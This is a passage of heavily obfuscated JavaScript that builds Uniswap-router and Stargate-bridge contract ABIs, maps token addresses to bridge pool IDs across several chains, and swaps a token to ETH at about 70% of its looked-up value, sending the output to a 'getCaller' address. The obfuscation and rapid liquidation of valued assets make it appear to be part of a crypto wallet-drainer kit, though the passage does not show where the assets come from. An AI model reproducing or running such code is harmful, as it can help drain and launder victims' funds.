            type: "address"
          };
          const _0x3fe475 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x1a85ac = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x599239 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x1a8661 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x146ef9 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x58d695 = {
            internalType: 'uint256',
            name: "amountToken",
            type: 'uint256'
          };
          const _0x38f32e = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0x118f14 = {
            inputs: [_0x181579, _0x3fe475, _0x1a85ac, _0x599239, _0x1a8661, _0x146ef9],
            name: "removeLiquidityETH",
            outputs: [_0x58d695, _0x38f32e],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x19ce8c = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x295f04 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x4d7c26 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x7ce556 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x4f3ae1 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x303421 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x2cf71e = {
            inputs: [_0x19ce8c, _0x295f04, _0x4d7c26, _0x7ce556, _0x4f3ae1, _0x303421],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4e277f = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x2e8f43 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x4671fa = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0xf26c86 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x114df7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xefeb60 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x8e5762 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x45083e = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x22916a = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x50e086 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x2e42d6 = {
            internalType: 'uint256',
            name: "amountToken",
            type: "uint256"
          };
          const _0x93f1da = {
            internalType: "uint256",
            name: "amountETH",
            type: 'uint256'
          };
          const _0x175cbd = {
            inputs: [_0x4e277f, _0x2e8f43, _0x4671fa, _0xf26c86, _0x114df7, _0xefeb60, _0x8e5762, _0x45083e, _0x22916a, _0x50e086],
            name: "removeLiquidityETHWithPermit",
            outputs: [_0x2e42d6, _0x93f1da],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x1fcafa = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x4714f2 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x203929 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x5c2456 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x3eee78 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x39b5f0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x462f95 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x5391a = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x51b677 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x5258ec = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x18419f = {
            internalType: "uint256",
            name: 'amountETH',
            type: "uint256"
          };
          const _0x376fe7 = {
            inputs: [_0x1fcafa, _0x4714f2, _0x203929, _0x5c2456, _0x3eee78, _0x39b5f0, _0x462f95, _0x5391a, _0x51b677, _0x5258ec],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [_0x18419f],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2c701f = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x30ed9b = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x4af93b = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x391064 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x2f407b = {
            internalType: 'uint256',
            name: 'amountBMin',
            type: "uint256"
          };
          const _0x525294 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x38fa02 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x522c9e = {
            internalType: "bool",
            name: 'approveMax',
            type: "bool"
          };
          const _0x351f0a = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x21c97d = {
            internalType: 'bytes32',
            name: 'r',
            type: "bytes32"
          };
          const _0x1c84a4 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x4af810 = {
            inputs: [_0x2c701f, _0x30ed9b, _0x4af93b, _0x391064, _0x2f407b, _0x525294, _0x38fa02, _0x522c9e, _0x351f0a, _0x21c97d, _0x1c84a4],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': "uint256",
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x18ba30 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x497608 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x5f3d22 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x515373 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2a5b12 = {
            inputs: [_0x18ba30, _0x497608, _0x5f3d22, _0x515373],
            name: "swapETHForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x47fbd6 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x4bfe64 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x32f4f6 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x39c295 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x54c6a8 = {
            inputs: [_0x47fbd6, _0x4bfe64, _0x32f4f6, _0x39c295],
            name: "swapExactETHForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x144f5a = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x9062d9 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x2c8b6b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5bea8e = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x49c641 = {
            inputs: [_0x144f5a, _0x9062d9, _0x2c8b6b, _0x5bea8e],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x1624ff = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x254f8d = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x443413 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x33c8a8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x52ed1a = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x575503 = {
            inputs: [_0x1624ff, _0x254f8d, _0x443413, _0x33c8a8, _0x52ed1a],
            name: "swapExactTokensForETH",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x534e80 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: "uint256"
          };
          const _0x49c6ea = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x4dee4e = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x372752 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x39f7ab = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x533156 = {
            inputs: [_0x534e80, _0x49c6ea, _0x4dee4e, _0x372752, _0x39f7ab],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3cbe84 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x52ad44 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x59b103 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x5544e9 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x149c87 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2c5b5e = {
            inputs: [_0x3cbe84, _0x52ad44, _0x59b103, _0x5544e9, _0x149c87],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': 'amounts',
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x575af3 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x18e910 = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x15148b = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x693944 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x511d8f = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4f2a94 = {
            inputs: [_0x575af3, _0x18e910, _0x15148b, _0x693944, _0x511d8f],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xe518a = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x407391 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x2bcf4e = {
            internalType: 'address[]',
            name: "path",
            type: "address[]"
          };
          const _0x196a3c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xc562a0 = {
            internalType: "uint256",
            name: "deadline",
            type: 'uint256'
          };
          const _0x9cd149 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: "uint256[]"
          };
          const _0x5b6a7c = {
            inputs: [_0xe518a, _0x407391, _0x2bcf4e, _0x196a3c, _0xc562a0],
            name: "swapTokensForExactETH",
            outputs: [_0x9cd149],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xb3d8b9 = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x36895e = {
            internalType: 'uint256',
            name: "amountInMax",
            type: "uint256"
          };
          const _0x4a2ef2 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x1f89ab = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2fb159 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x21eb38 = {
            inputs: [_0xb3d8b9, _0x36895e, _0x4a2ef2, _0x1f89ab, _0x2fb159],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4861ef = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x40c4b7 = [_0x335c68, _0x1b8f15, _0x3ba839, _0x3639, _0x599c83, _0x2d85b3, _0xffdc9a, _0x5bc779, _0x450e9e, _0x2ac7da, _0x1cf1a2, _0x118f14, _0x2cf71e, _0x175cbd, _0x376fe7, _0x4af810, _0x2a5b12, _0x54c6a8, _0x49c641, _0x575503, _0x533156, _0x2c5b5e, _0x4f2a94, _0x5b6a7c, _0x21eb38, _0x4861ef];
          let _0x5510b6 = new ethers.Contract(_0x3941f8, _0x40c4b7, _0xab3127);
          let _0x5ca1f0 = await _0x5510b6.WETH();
          let _0x174f81 = [];
          _0x174f81[0] = _0x2a18aa.asset.token;
          _0x174f81[1] = _0x5ca1f0;
          try {
            let _0x49569d = this.token_array.find(_0x2de5fb => _0x2de5fb.token_address == _0x2a18aa.asset.token && _0x2de5fb.chain == _0x2a18aa.chain);
            let _0x50be4f = this.token_array.find(_0x5835f3 => _0x5835f3.token_address == "native" && _0x5835f3.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x49569d.value) * Number(0.7) / Number(_0x50be4f.price)).toString(), 'ether'));
          } catch {}
          return [_0x5510b6.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x174f81, this.getCaller(_0x2a18aa), _0x4d5eff), _0x5ca1f0];
        }
      case 'Stargate':
        {
          let _0x3f081c = _0x2a18aa.chain;
          let _0x3bead9 = 101;
          let _0x53deb7 = 110;
          let _0xd77c09 = 1;
          let _0x1998f6 = 1;
          console.log("checking path for stargate");
          switch (_0x3f081c) {
            case 'eth':
              {
                _0x3bead9 = 101;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xdac17f958d2ee523a2206206994597c13d831ec7":
                    {
                      _0xd77c09 = 2;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0x6b175474e89094c44da98b954eedeac495271d0f":
                    {
                      _0xd77c09 = 3;
                      _0x1998f6 = 3;
                      _0x53deb7 = 109;
                    }
                    break;
                  case "0x853d955acef822db058eb8505911ed77f175b99e":
                    {
                      _0xd77c09 = 7;
                      _0x1998f6 = 7;
                    }
                    break;
                  case "0x57ab1ec28d129707052df4df418d58a2d46d5f51":
                    {
                      _0xd77c09 = 14;
                      _0x1998f6 = 14;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0x0c10bf8fcb7bf5412187a595ab97a3609160b5c6":
                    {
                      _0xd77c09 = 11;
                      _0x1998f6 = 11;
                      _0x53deb7 = 102;
                    }
                    break;
                  case "0x5f98805a4e8be255a32880fdec7f6728c6568ba0":
                    {
                      _0xd77c09 = 15;
                      _0x1998f6 = 15;
                    }
                    break;
                  case "0x8d6cebd76f18e1558d4db88138e2defb3909fad6":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                    }
                    break;
                }
              }
            case 'bsc':
              {
                _0x3bead9 = 102;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0x55d398326f99059ff775485246999027b3197955":
                    {
                      _0xd77c09 = 2;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xe9e7cea3dedca5984780bafc599bd69add087d56":
                    {
                      _0xd77c09 = 5;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xd17479997f34dd9156deef8f95a52d81d265be9c":
                    {
                      _0xd77c09 = 11;
                      _0x1998f6 = 11;
                      _0x53deb7 = 101;
                    }
                    break;
                  case "0x3f56e0c36d275367b8c502090edf38289b3dea0d":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                    }
                    break;
                }
              }
            case 'avax':
              {
                _0x3bead9 = 106;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7":
                    {
                      _0xd77c09 = 2;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xd24c2ad096400b6fbcd2ad8b24e7acbc21a1da64":
                    {
                      _0xd77c09 = 7;
                      _0x1998f6 = 7;
                    }
                    break;
                  case "0x5c49b268c9841aff1cc3b0a418ff5c3442ee3f3b":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                    }
                    break;
                }
              }
            case "matic":
              {
                _0x3bead9 = 109;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0x2791bca1f2de4661ed88a30c99a7a9449aa84174":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xc2132d05d31c914a87c6611c10748aeb04b58e8f":
                    {
                      _0xd77c09 = 2;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063":
                    {
                      _0xd77c09 = 3;
                      _0x1998f6 = 3;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0xa3fa99a148fa48d14ed51d610c367c61876997f1":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                    }
                    break;
                }
              }
            case 'arb':
              {
                _0x3bead9 = 110;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9":
                    {
                      _0xd77c09 = 2;
                      _0x1998f6 = 1;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0x17fc002b466eec40dae837fc4be5c67993ddbd6f":
                    {
                      _0xd77c09 = 7;
                      _0x1998f6 = 7;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0x93b346b6bc2548da6a1e7d98e9a421b42541425b":
                    {
                      _0xd77c09 = 15;
                      _0x1998f6 = 15;
                      _0x53deb7 = 111;
                    }
                    break;
                  case "0x3f56e0c36d275367b8c502090edf38289b3dea0d":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                      _0x53deb7 = 111;
                    }
                    break;
                }
              }
            case 'op':
              {
                _0x3bead9 = 111;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0x7f5c764cbc14f9669b88837ca1490cca17c31607":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                    }
                    break;
                  case "0xda10009cbd5d07dd0cecc66161fc93d7c9000da1":
                    {
                      _0xd77c09 = 3;
                      _0x1998f6 = 3;
                      _0x53deb7 = 109;
                    }
                    break;
                  case "0x2e3d870790dc77a83dd1d18184acc7439a53f475":
                    {
                      _0xd77c09 = 7;
                      _0x1998f6 = 7;
                    }
                    break;
                  case "0x8c6f28f2f1a3c87f0f938b96d27520d9751ec8d9":
                    {
                      _0xd77c09 = 14;
                      _0x1998f6 = 14;
                      _0x53deb7 = 101;
                    }
                    break;
                  case "0xc40f949f8a4e094d1b49a23ea9241d289b7b2819":
                    {
                      _0xd77c09 = 15;
                      _0x1998f6 = 15;
                    }
                    break;
                  case "0xdfa46478f9e5ea86d57387849598dbfb2e964b02":
                    {
                      _0xd77c09 = 16;
                      _0x1998f6 = 16;
                    }
                    break;
                }
              }
            case 'ftm':
              {
                _0x3bead9 = 112;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0x28a92dde19d9989f39a49905d7c9c2fac7799bdf":
                    {
                      _0xd77c09 = 21;
                      _0x1998f6 = 1;
                    }
                    break;
                }
              }
            case 'base':
              {
                _0x3bead9 = 184;
                switch (_0x2a18aa.asset.token.toLowerCase()) {
                  case "0xd9aaec86b65d86f6a7b5b1b0c42ffa531710b6ca":
                    {
                      _0xd77c09 = 1;
                      _0x1998f6 = 1;
                    }
                    break;
                }
              }
          }
          const _0x3f5d3b = {
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x52dbda = {
            indexed: false,
            internalType: "uint16",
            name: 'chainId',
            type: "uint16"
          };
          const _0x3d975f = {
            indexed: false,
            internalType: "bytes",
            name: 'srcAddress',
            type: "bytes"
          };
          const _0x2c7725 = {
            indexed: false,
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x523bde = {
            indexed: false,
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x10bd1f = {
            indexed: false,
            internalType: 'uint256',
            name: "amountLD",
            type: 'uint256'
          };
          const _0x250a1a = {
            indexed: false,
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5b9f82 = {
            indexed: false,
            internalType: "bytes",
            name: 'payload',
            type: "bytes"
          };
          const _0x4f1355 = {
            indexed: false,
            internalType: "bytes",
            name: "reason",
            type: "bytes"
          };
          const _0x2e1546 = {
            anonymous: false,
            inputs: [_0x52dbda, _0x3d975f, _0x2c7725, _0x523bde, _0x10bd1f, _0x250a1a, _0x5b9f82, _0x4f1355],
            name: "CachedSwapSaved",
            type: 'event'
          };
          const _0x5e2880 = {
            indexed: true,
            internalType: "address",
            name: "previousOwner",
            type: "address"
          };
          const _0x228950 = {
            indexed: true,
            internalType: "address",
            name: "newOwner",
            type: "address"
          };
          const _0x27b338 = {
            anonymous: false,
            inputs: [_0x5e2880, _0x228950],
            name: "OwnershipTransferred",
            type: 'event'
          };
          const _0x1ee916 = {
            indexed: false,
            internalType: "uint16",
            name: "srcChainId",
            type: "uint16"
          };
          const _0x2a3af9 = {
            indexed: true,
            internalType: "bytes",
            name: "srcAddress",
            type: "bytes"
          };
          const _0x2fb10c = {
            indexed: true,
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x1d30b7 = {
            indexed: false,
            internalType: 'uint256',
            name: "srcPoolId",
            type: "uint256"
          };
          const _0x45de86 = {
            indexed: false,
            internalType: 'uint256',
            name: "dstPoolId",
            type: "uint256"
          };
          const _0x2c99d = {
            indexed: false,
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x26e13d = {
            indexed: false,
            internalType: 'uint256',
            name: "amountSD",
            type: 'uint256'
          };
          const _0xe90fe8 = {
            indexed: false,
            internalType: 'uint256',
            name: "mintAmountSD",
            type: "uint256"
          };
          const _0x2ca4da = {
            anonymous: false,
            inputs: [_0x1ee916, _0x2a3af9, _0x2fb10c, _0x1d30b7, _0x45de86, _0x2c99d, _0x26e13d, _0xe90fe8],
            name: "RedeemLocalCallback",
            type: 'event'
          };
          const _0x1719c5 = {
            indexed: false,
            internalType: "uint8",
            name: "bridgeFunctionType",
            type: 'uint8'
          };
          const _0x4c495d = {
            indexed: false,
            internalType: "uint16",
            name: 'chainId',
            type: "uint16"
          };
          const _0x724857 = {
            indexed: false,
            internalType: "bytes",
            name: "srcAddress",
            type: "bytes"
          };
          const _0x2e633e = {
            indexed: false,
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x32984c = {
            anonymous: false,
            inputs: [_0x1719c5, _0x4c495d, _0x724857, _0x2e633e],
            name: "Revert",
            type: "event"
          };
          const _0xebb315 = {
            indexed: false,
            internalType: "uint16",
            name: "srcChainId",
            type: "uint16"
          };
          const _0x14caae = {
            indexed: false,
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x2ec36e = {
            indexed: false,
            internalType: 'uint256',
            name: '_dstPoolId',
            type: "uint256"
          };
          const _0x5643bb = {
            indexed: false,
            internalType: "bytes",
            name: 'to',
            type: "bytes"
          };
          const _0x308b00 = {
            indexed: false,
            internalType: 'uint256',
            name: "redeemAmountSD",
            type: "uint256"
          };
          const _0x34c07a = {
            indexed: false,
            internalType: 'uint256',
            name: "mintAmountSD",
            type: "uint256"
          };
          const _0x2642ff = {
            indexed: true,
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x20c8ae = {
            indexed: true,
            internalType: "bytes",
            name: "srcAddress",
            type: "bytes"
          };
          const _0x15cda7 = {
            anonymous: false,
            inputs: [_0xebb315, _0x14caae, _0x2ec36e, _0x5643bb, _0x308b00, _0x34c07a, _0x2642ff, _0x20c8ae],
            name: "RevertRedeemLocal",
            type: 'event'
          };
          const _0x88ebc7 = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x28f7b0 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x54100b = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: "uint256"
          };
          const _0x3bc0c2 = {
            inputs: [_0x88ebc7, _0x28f7b0, _0x54100b],
            name: "activateChainPath",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x274fbf = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x158917 = {
            internalType: 'uint256',
            name: "_amountLD",
            type: "uint256"
          };
          const _0x117ee4 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x2429ef = {
            inputs: [_0x274fbf, _0x158917, _0x117ee4],
            name: "addLiquidity",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xa1f0f = {
            inputs: [],
            name: 'bridge',
            outputs: [{
              'internalType': "contract Bridge",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x210395 = {
            internalType: "uint16",
            name: '',
            type: "uint16"
          };
          const _0x2e93a6 = {
            internalType: 'bytes',
            name: '',
            type: "bytes"
          };
          const _0x2b1fde = {
            internalType: 'uint256',
            name: '',
            type: "uint256"
          };
          const _0x219490 = {
            inputs: [_0x210395, _0x2e93a6, _0x2b1fde],
            name: "cachedSwapLookup",
            outputs: [{
              'internalType': "address",
              'name': "token",
              'type': "address"
            }, {
              'internalType': 'uint256',
              'name': "amountLD",
              'type': 'uint256'
            }, {
              'internalType': "address",
              'name': 'to',
              'type': "address"
            }, {
              'internalType': "bytes",
              'name': "payload",
              'type': "bytes"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x41a38e = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x31a5f7 = {
            internalType: 'bool',
            name: "_fullMode",
            type: "bool"
          };
          const _0x17964c = {
            inputs: [_0x41a38e, _0x31a5f7],
            name: "callDelta",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x548169 = {
            internalType: "uint16",
            name: "_srcChainId",
            type: "uint16"
          };
          const _0x5df2b7 = {
            internalType: "bytes",
            name: "_srcAddress",
            type: "bytes"
          };
          const _0x2f54a3 = {
            internalType: 'uint256',
            name: "_nonce",
            type: 'uint256'
          };
          const _0x590178 = {
            inputs: [_0x548169, _0x5df2b7, _0x2f54a3],
            name: "clearCachedSwap",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x264df6 = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x5a1b82 = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x43e954 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x219673 = {
            internalType: "uint256",
            name: "_weight",
            type: 'uint256'
          };
          const _0x2b1582 = {
            inputs: [_0x264df6, _0x5a1b82, _0x43e954, _0x219673],
            name: "createChainPath",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x46d09b = {
            internalType: 'uint256',
            name: "_poolId",
            type: 'uint256'
          };
          const _0x22203e = {
            internalType: "address",
            name: '_token',
            type: "address"
          };
          const _0x4026c6 = {
            internalType: "uint8",
            name: "_sharedDecimals",
            type: "uint8"
          };
          const _0x595fad = {
            internalType: "uint8",
            name: "_localDecimals",
            type: "uint8"
          };
          const _0xd83e0 = {
            internalType: "string",
            name: "_name",
            type: "string"
          };
          const _0x41bcd3 = {
            internalType: "string",
            name: "_symbol",
            type: "string"
          };
          const _0x355fd5 = {
            inputs: [_0x46d09b, _0x22203e, _0x4026c6, _0x595fad, _0xd83e0, _0x41bcd3],
            name: 'createPool',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x278f9f = {
            internalType: "uint16",
            name: "_dstChainId",
            type: "uint16"
          };
          const _0x349185 = {
            internalType: 'uint256',
            name: "_dstPoolId",
            type: 'uint256'
          };
          const _0x3622ea = {
            internalType: 'uint256',
            name: '_srcPoolId',
            type: 'uint256'
          };
          const _0x5d20f1 = {
            internalType: 'uint256',
            name: 'credits',
            type: 'uint256'
          };
          const _0x5910e4 = {
            internalType: "uint256",
            name: "idealBalance",
            type: 'uint256'
          };
          const _0x46f88c = {
            components: [_0x5d20f1, _0x5910e4],
            internalType: "struct Pool.CreditObj",
            name: '_c',
            type: 'tuple'
          };
          const _0x4f5d51 = {
            inputs: [_0x278f9f, _0x349185, _0x3622ea, _0x46f88c],
            name: "creditChainPath",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x588b32 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "contract Factory",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xb54b32 = {
            internalType: "uint16",
            name: "_srcPoolId",
            type: "uint16"
          };
          const _0x1de2ef = {
            internalType: 'uint256',
            name: "_amountLP",
            type: 'uint256'
          };
